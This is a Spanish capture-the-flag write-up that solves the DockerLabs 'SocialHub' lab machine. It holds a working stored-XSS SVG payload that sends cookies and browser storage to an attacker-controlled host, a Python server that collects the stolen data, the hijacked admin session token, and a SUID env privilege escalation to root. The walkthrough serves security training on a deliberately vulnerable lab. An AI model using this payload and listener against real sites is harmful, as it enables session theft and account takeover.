---
icon: flag
---

# SocialHub DockerLabs (Hard)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip socialhub.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh socialhub.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 09:55 CET
Nmap scan report for 172.17.0.2
Host is up (0.000058s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ca:f9:f5:87:5b:5c:6e:a3:21:c3:d3:71:ea:ac:41:9c (ECDSA)
|_  256 d6:99:7f:62:73:87:f7:2d:6e:7f:3d:6f:4c:6e:96:94 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.10.12)
|_http-server-header: Werkzeug/3.0.1 Python/3.10.12
|_http-title: Bienvenido - SocialHub
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

Veremos un puerto `5000` en el que aloja una pagina web de `python3` por lo que se ve y suele utilizar la tecnologia `Flask`, si entramos dentro de dicha pagina veremos lo siguiente.

```
URL = http://<IP>:5000/
```

Veremos una pagina web relacionada con una red social, veremos un `login` y `register`, vamos a probar a registrar un usuario para iniciar sesion y ver el `dashboard`.

<figure><img src="../../.gitbook/assets/Pasted image 20251206101021.png" alt=""><figcaption></figcaption></figure>

Vemos que podemos ver los perfiles de los usuarios, pero en concreto si nos vamos al nuestro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251206101058.png" alt=""><figcaption></figcaption></figure>

Vemos que podemos subir una foto de perfil y en concreto vemos varios formatos:

```
Formatos permitidos: PNG, JPG, JPEG, GIF, SVG (max 5MB) 
```

Nos atrae mucho el formato `SVG` y esto se debe a que si inspeccionamos el codigo veremos esta parte de aqui.

```html
<script>
        setTimeout(() => {
            const messages = document.querySelectorAll('.flash-message');
            messages.forEach(msg => {
                msg.style.animation = 'slideOut 0.3s ease-out forwards';
                setTimeout(() => msg.remove(), 300);
            });
        }, 5000);
        
        if (!localStorage.getItem('api_token')) {
            localStorage.setItem('api_token', 'sk-live-28a7f9e2b3c1d4a5e6f789012345abcdef');
            localStorage.setItem('user_email', 'diseo@socialhub.com');
            localStorage.setItem('user_role', 'premium_user');
            localStorage.setItem('last_login', new Date().toISOString());
        }
        
    </script>
```

#### **Vulnerabilidades identificadas:**

1. **Stored XSS via SVG** - Acepta SVG sin sanitización
2. **Tokens sensibles en localStorage** - API tokens almacenados
3. **Posible falta de sanitización en feed** - SVG se renderiza crudo

## Escalate user hijacking

### Stored XSS via SVG

Vamos a probar la explotacion subiendo un `SVG` con un `payload` en concreto ya que por detras entiendo que se ejecuta de forma automatica por el `admin`, pero tambien tendremos que crear un `server.py` para recibir las `Cookies` que se roben.

> payload.svg

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[
  // ENFOQUE: Robar lo que sea que dé acceso

  var attacker = "http://<IP_ATTACKER>:8000";

  // 1. Intentar document.cookie (normal)
  if (document.cookie && document.cookie.length > 10) {
    var img1 = new Image();
    img1.src = attacker + "/?method=document_cookie&data=" + encodeURIComponent(document.cookie);
  }

  // 2. Intentar localStorage (como vimos en el HTML)
  if (localStorage && localStorage.length > 0) {
    var lsData = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      lsData[key] = localStorage.getItem(key);
    }
    var img2 = new Image();
    img2.src = attacker + "/?method=localStorage&data=" + encodeURIComponent(JSON.stringify(lsData));
  }

  // 3. Intentar sessionStorage
  if (sessionStorage && sessionStorage.length > 0) {
    var ssData = {};
    for (var i = 0; i < sessionStorage.length; i++) {
      var key = sessionStorage.key(i);
      ssData[key] = sessionStorage.getItem(key);
    }
    var img3 = new Image();
    img3.src = attacker + "/?method=sessionStorage&data=" + encodeURIComponent(JSON.stringify(ssData));
  }

  // 4. Intentar hacer petición AUTENTICADA y capturar respuesta
  setTimeout(function() {
    fetch("/profile", {
      method: "GET",
      credentials: "include"  // Esto envía cookies automáticamente
    })
    .then(response => {
      // Obtener cookies de los headers de respuesta
      var cookiesFromHeaders = response.headers.get('set-cookie') || 'no-set-cookie-header';

      // Enviar info
      var img4 = new Image();
      img4.src = attacker + "/?method=fetch_response&cookies=" + encodeURIComponent(cookiesFromHeaders) +
                 "&url=/profile&status=" + response.status;
    })
    .catch(e => {
      var img5 = new Image();
      img5.src = attacker + "/?method=fetch_error&error=" + encodeURIComponent(e.message);
    });
  }, 1000);

  // 5. Intentar acceder a document.cookie via iframe (bypass HttpOnly)
  setTimeout(function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = '/';  // Página que podría setear cookies
    document.body.appendChild(iframe);

    setTimeout(function() {
      try {
        var iframeCookies = iframe.contentDocument.cookie;
        var img6 = new Image();
        img6.src = attacker + "/?method=iframe&cookies=" + encodeURIComponent(iframeCookies);
      } catch(e) {
        // Cross-origin error esperado
      }
    }, 2000);
  }, 500);

  console.log("SVG payload ejecutado - múltiples métodos activados");
]]>
</script>
<rect width="200" height="200" fill="orange"/>
<text x="100" y="100" fill="white">TEST</text>
</svg>
```

> server.py

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import datetime
import html

class XSSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)

        print("\n" + "="*60)
        print(f"[{datetime.datetime.now()}] Nueva víctima!")
        print("="*60)

        # Mostrar datos básicos
        print(f"User-Agent: {self.headers.get('User-Agent')}")
        print(f"IP: {self.client_address[0]}")

        # Procesar datos exfiltrados
        if 'data' in query:
            try:
                data = json.loads(query['data'][0])
                print("\n[+] DATOS ROBADOS:")
                print("-" * 40)

                if 'cookies' in data and data['cookies']:
                    print(f"Cookies: {data['cookies']}")

                if 'localStorage' in data:
                    print("\n[+] localStorage:")
                    for key, value in data['localStorage'].items():
                        print(f"  {key}: {value}")
                        # Buscar flags automáticamente
                        if 'flag' in str(value).lower():
                            print(f"  ⚑ POSIBLE FLAG ENCONTRADA en {key}: {value}")

                if 'sessionStorage' in data:
                    print("\n[+] sessionStorage:")
                    for key, value in data['sessionStorage'].items():
                        print(f"  {key}: {value}")

                if 'csrfToken' in data:
                    print(f"\nCSRF Token: {data['csrfToken']}")

                print(f"\nURL: {data.get('url', 'N/A')}")
                print(f"User-Agent: {data.get('userAgent', 'N/A')}")

            except Exception as e:
                print(f"Error procesando datos: {e}")
                print(f"Query raw: {query}")

        elif 'c' in query:
            print(f"\n[+] Cookie recibida: {query['c'][0]}")

        elif 'flags' in query:
            print(f"\n[+] FLAGS ENCONTRADAS: {query['flags'][0]}")

        # Enviar respuesta vacía (1x1 pixel transparente)
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

        # 1x1 pixel PNG transparente
        self.wfile.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x00\r\n\xd5\xa2\x00\x00\x00\x00IEND\xaeB`\x82')

    def log_message(self, format, *args):
        # Silenciar logs normales
        pass

def run_server(port=8000):
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, XSSHandler)

    print(f"✅ Servidor XSS escuchando en http://0.0.0.0:{port}")
    print(f"📡 Accesible desde: http://TU_IP:{port}")
    print("🕵️  Esperando víctimas...")
    print("-" * 60)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Servidor detenido")
        httpd.server_close()

if __name__ == '__main__':
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    run_server(port)
```

Una vez creado todo esto, vamos a ponernos a la escucha con el servidor ejecutandolo de esta forma:

```shell
python3 server.py
```

Info:

```
✅ Servidor XSS escuchando en http://0.0.0.0:8000
📡 Accesible desde: http://TU_IP:8000
🕵️  Esperando víctimas...
------------------------------------------------------------
```

Ahora desde la pagina vamos a subir el archivo `.svg` que hemos creado, hecho esto tendremos que esperar unos segundos y veremos lo siguiente en el servidor:

```
============================================================
[2025-12-06 10:28:04.783121] Nueva víctima!
============================================================
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36
IP: 172.17.0.2
Error procesando datos: Expecting value: line 1 column 1 (char 0)
Query raw: {'method': ['document_cookie'], 'data': ['session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aTP3JA.xGLiiwj1uwHMRi-3Kd6szil-HVA']}

============================================================
[2025-12-06 10:28:04.784118] Nueva víctima!
============================================================
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36
IP: 172.17.0.2

[+] DATOS ROBADOS:
----------------------------------------

URL: N/A
User-Agent: N/A

============================================================
[2025-12-06 10:28:05.792530] Nueva víctima!
============================================================
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36
IP: 172.17.0.2

============================================================
[2025-12-06 10:28:06.733828] Nueva víctima!
============================================================
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36
IP: 172.17.0.2
Error procesando datos: Expecting value: line 1 column 1 (char 0)
Query raw: {'method': ['document_cookie'], 'data': ['session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aTP3JA.xGLiiwj1uwHMRi-3Kd6szil-HVA']}

============================================================
[2025-12-06 10:28:06.734176] Nueva víctima!
============================================================
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36
IP: 172.17.0.2

[+] DATOS ROBADOS:
----------------------------------------

URL: N/A
User-Agent: N/A

============================================================
[2025-12-06 10:28:07.742271] Nueva víctima!
============================================================
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.6099.28 Safari/537.36
IP: 172.17.0.2
```

Veremos muchas formas de explotarlo, pero entre ellas veremos una que ha funcionado, por lo que habremos obtenido el `TOKEN` de sesion del `admin`, ahora solamente tendremos que irnos a la web e intercambiar el `TOKEN` nuestro actual por el que hemos obtenido para ser dicho usuario.

> TOKEN: `eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aTP3JA.xGLiiwj1uwHMRi-3Kd6szil-HVA`

<figure><img src="../../.gitbook/assets/Pasted image 20251206102925.png" alt=""><figcaption></figcaption></figure>

Una vez que lo hayamos cambiado, vamos a recargar la pagina y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251206102911.png" alt=""><figcaption></figcaption></figure>

Lo hemos conseguido, por lo que nos dara unas credenciales para conectarnos por `SSH` directamente.

### SSH

```shell
ssh hijacking@<IP>
```

Metemos como contraseña `cookiedelicious`...

```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

hijacking@d555308071a4:~$ whoami
hijacking
```

Con esto ya estaremos dentro.

## Escalate Privileges

Si listamos los permisos `SUID` que tengamos en el sistema veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
4850133     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
  4850032     40 -rwsr-xr-x   1 root     root        40496 Nov 24  2022 /usr/bin/newgrp
  4849907     44 -rwsr-xr-x   1 root     root        44808 Nov 24  2022 /usr/bin/chsh
  4849901     72 -rwsr-xr-x   1 root     root        72712 Nov 24  2022 /usr/bin/chfn
  4850107     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
  4849969     72 -rwsr-xr-x   1 root     root        72072 Nov 24  2022 /usr/bin/gpasswd
  4850043     60 -rwsr-xr-x   1 root     root        59976 Nov 24  2022 /usr/bin/passwd
  4850027     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
  5132272     44 -rwsr-xr-x   1 root     root        43968 Feb  7  2022 /usr/bin/env
  5132287    228 -rwsr-xr-x   1 root     root       232416 Jun 25 12:48 /usr/bin/sudo
  5132297    332 -rwsr-xr-x   1 root     root       338536 Apr 11  2025 /usr/lib/openssh/ssh-keysign
  4861573     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Veremos en concreto este binario con dichos permisos:

```
5132272     44 -rwsr-xr-x   1 root     root        43968 Feb  7  2022 /usr/bin/env
```

Gracias a esto podremos ser `root` directamente con el siguiente comando:

```shell
env /bin/bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto ya seremos el usuario `root`, por lo que habremos terminado la maquina.
